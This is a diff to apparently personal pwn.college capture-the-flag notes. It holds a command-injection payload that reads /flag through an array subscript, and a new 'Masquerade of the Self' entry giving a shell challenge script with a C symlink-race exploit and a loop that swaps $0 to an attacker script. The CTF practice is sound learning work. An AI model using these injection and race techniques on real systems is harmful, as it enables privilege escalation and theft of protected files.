@@ -316,3 +316,48 @@ echo "You are quite skilled!"
 /challenge/run "a[\$(cat /flag)]"
 ```
 TODO
+
+# Masquerade of the Self
+
+### chall
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/sh
+
+PATH=/usr/bin
+
+case "$1" in
+	"hi")
+		echo hello
+		;;
+	"bye")
+		echo ciao
+		;;
+	"help")
+		echo "Usage: $0 ( hi | bye )"
+		;;
+	*)
+		echo "Invalid command: $1"
+		$0 help
+		;;
+esac
+```
+
+### exploit
+program
+```c
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+int main(int argc, char** argv) {
+    while (1) {
+        unlink("/home/hacker/zezva");
+        symlink("/challenge/run", "/home/hacker/zezva");
+        unlink("/home/hacker/zezva");
+        symlink("/home/hacker/test.sh", "/home/hacker/zezva");
+    }
+}
+```
+```sh
+while true; do ./program 2>/dev/null; done | grep pwn & ./program
+```
